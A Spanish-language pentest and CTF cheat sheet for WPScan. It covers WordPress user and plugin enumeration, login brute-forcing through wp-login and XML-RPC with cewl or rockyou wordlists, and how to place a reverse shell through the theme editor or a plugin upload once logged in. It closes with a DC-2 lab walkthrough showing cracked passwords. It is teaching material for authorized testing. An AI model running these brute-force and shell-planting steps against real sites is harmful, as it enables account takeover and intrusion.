# WPScan

## Descripción

WPScan es la herramienta estándar para auditar sitios WordPress. Enumera usuarios, plugins, temas y versiones vulnerables, y puede realizar ataques de fuerza bruta al login. Es el equivalente a Nmap pero específico para WordPress.

**Cuándo usarla:** Siempre que identifiques un sitio WordPress en un pentest o CTF.

---

## Instalación

Viene preinstalada en Kali Linux:

```shell
wpscan --version
```

Para actualizarla:
```shell
wpscan --update
```

---

## Enumeración básica

### Escaneo general

```shell
wpscan --url http://TARGET
```

Esto detecta automáticamente:
- Versión de WordPress
- Temas activos y su versión
- Plugins instalados
- Archivos expuestos (readme.html, xmlrpc.php, etc.)

### Enumerar usuarios ⭐

```shell
wpscan --url http://TARGET --enumerate u
```

WordPress expone usuarios por varios métodos:
- `/?author=1`, `/?author=2`... → redirecciona al perfil del autor
- `/wp-json/wp/v2/users/` → API REST que lista usuarios directamente
- RSS feeds → contienen el autor de cada post
- Mensajes de error en el login → "usuario incorrecto" vs "contraseña incorrecta"

### Enumerar plugins

```shell
wpscan --url http://TARGET --enumerate p
```

Los plugins son el vector de ataque más común en WordPress — suelen tener más vulnerabilidades que el core.

### Enumerar temas

```shell
wpscan --url http://TARGET --enumerate t
```

### Enumeración completa

```shell
wpscan --url http://TARGET --enumerate u,p,t,cb,dbe
```

| Flag | Qué enumera |
|------|-------------|
| `u` | Usuarios |
| `p` | Plugins |
| `t` | Temas |
| `cb` | Config backups |
| `dbe` | DB exports |

---

## Fuerza bruta

### Con wordlist personalizada

```shell
wpscan --url http://TARGET --usernames jerry --passwords wordlist.txt
```

### Con múltiples usuarios

```shell
# Crear archivo de usuarios
echo -e "admin\njerry\ntom" > usuarios.txt

wpscan --url http://TARGET --usernames usuarios.txt --passwords wordlist.txt
```

### Especificar método de ataque

```shell
# Via formulario wp-login.php (por defecto)
wpscan --url http://TARGET --usernames admin --passwords rockyou.txt --password-attack wp-login

# Via XML-RPC (más rápido, permite múltiples intentos por petición)
wpscan --url http://TARGET --usernames admin --passwords rockyou.txt --password-attack xmlrpc
```

**XML-RPC** es especialmente útil porque permite enviar múltiples contraseñas en una sola petición HTTP, haciendo el ataque mucho más rápido.

---

## Opciones importantes

```shell
--url URL              # URL del sitio WordPress (obligatorio)
--enumerate u          # Enumerar usuarios
--enumerate p          # Enumerar plugins
--usernames FILE/USER  # Usuario o archivo de usuarios para brute force
--passwords FILE       # Wordlist para brute force
--password-attack      # Método: wp-login, xmlrpc, xmlrpc-multicall
--api-token TOKEN      # Token para acceder a base de datos de vulnerabilidades
--disable-tls-checks   # Ignorar errores de certificado SSL
--random-agent         # Usar User-Agent aleatorio para evasión
-t THREADS             # Número de hilos (por defecto 5)
```

---

## API Token — vulnerabilidades

Sin API token, WPScan no muestra vulnerabilidades conocidas de plugins y temas. Para obtener un token gratuito (25 búsquedas/día):

1. Registrarse en `https://wpscan.com/register`
2. Usar el token:
```shell
wpscan --url http://TARGET --enumerate p --api-token TU_TOKEN
```

---

## Archivos interesantes que encuentra WPScan

| Archivo | Qué contiene |
|---------|-------------|
| `/readme.html` | Versión exacta de WordPress |
| `/xmlrpc.php` | API antigua — permite brute force masivo |
| `/wp-cron.php` | Tareas programadas |
| `/wp-login.php` | Panel de login |
| `/.htaccess` | Configuración Apache |
| `/wp-config.php.bak` | Backup con credenciales de BD |

---

## Flujo recomendado para WordPress

```
1. wpscan --url http://TARGET --enumerate u
   → Obtener lista de usuarios

2. cewl -d 3 -m 3 http://TARGET -w wordlist.txt
   → Generar wordlist del contenido del sitio

3. wpscan --url http://TARGET --usernames usuarios.txt --passwords wordlist.txt
   → Fuerza bruta con wordlist personalizada

4. Si no funciona con cewl, probar con rockyou.txt
   → wpscan --url http://TARGET --usernames usuarios.txt --passwords /usr/share/wordlists/rockyou.txt

5. Con credenciales → acceder al panel /wp-login.php
   → Buscar vectores: editor de temas, plugins, subida de archivos
```

---

## Panel de administración — vectores de ataque

Una vez dentro del panel como administrador:

**Editor de temas (más común):**
```
Apariencia → Editor → Seleccionar archivo PHP → Añadir reverse shell
```

**Editor de plugins:**
```
Plugins → Editor → Seleccionar plugin activo → Modificar código PHP
```

**Subida de plugins:**
```
Plugins → Añadir nuevo → Subir plugin → Subir ZIP con reverse shell
```

---

## Ejemplo real — Máquina DC-2

```shell
# Enumerar usuarios
wpscan --url http://dc-2 --enumerate u
# Encontró: admin, jerry, tom

# Generar wordlist con cewl
cewl -d 3 -m 3 --lowercase -w palabras_cewl.txt http://dc-2/

# Fuerza bruta
wpscan --url http://dc-2 --usernames jerry --passwords palabras_cewl.txt
# Resultado: jerry/adipiscing, tom/parturient
```
